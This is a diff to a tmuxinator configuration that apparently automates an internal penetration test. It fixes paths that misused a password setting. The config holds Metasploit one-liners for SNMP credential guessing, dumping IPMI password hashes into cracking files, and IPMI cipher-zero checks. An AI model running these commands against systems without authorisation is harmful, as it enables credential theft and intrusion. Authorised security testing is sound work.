@@ -17,7 +17,7 @@ root: /RSM/
   ### example of starting project with arguments: tmuxinator start internalTemplate domain=rsmus.local ##"
 %>
 
-on_project_start: mkdir -p /opt/nomad-tools <%= @settings["rootDir"] %>/scans/nmap <%= @settings["nomadPass"] %>/loot
+on_project_start: mkdir -p /opt/nomad-tools <%= @settings["rootDir"] %>/scans/nmap <%= @settings["rootDir"] %>/loot
 
 # create and cd into client/testing folder before running
 windows:
@@ -52,7 +52,7 @@ windows:
           - cat <%= @settings["rootDir"] %>/scans/masscanPortList/snmp.lst && msfconsole -q -x "workspace -a <%= @settings["msfWorkspace"] %>; use auxiliary/scanner/snmp/snmp_login; set rhosts file:<%= @settings["rootDir"] %>/scans/masscanPortList/snmp.lst; spool <%= @settings["rootDir"] %>/scans/snmpLogin.txt; run; spool off; exit"
         - IPMI Cipher Zero:
           - tmux select-pane -T 'IPMI Cipher Zero' -t "unauthd:services.3"
-          - mkdir -p <%= @settings["rootDir"] %>/loot/ipmi <%= @settings["nomadPass"] %>/scans/ipmi
+          - mkdir -p <%= @settings["rootDir"] %>/loot/ipmi
           - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi/ipmi_version.txt; run; spool off; exit'
           - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set OUTPUT_HASHCAT_FILE /<%= @settings["rootDir"] %>/loot/ipmi/ipmiHashes.hashcat; set OUTPUT_JOHN_FILE /<%= @settings["rootDir"] %>/loot/ipmi/ipmiHashes.john; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_dumphashes.txt; run; spool off; exit'
           - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi/ipmi_cipher_zero.txt; run; spool off; exit'
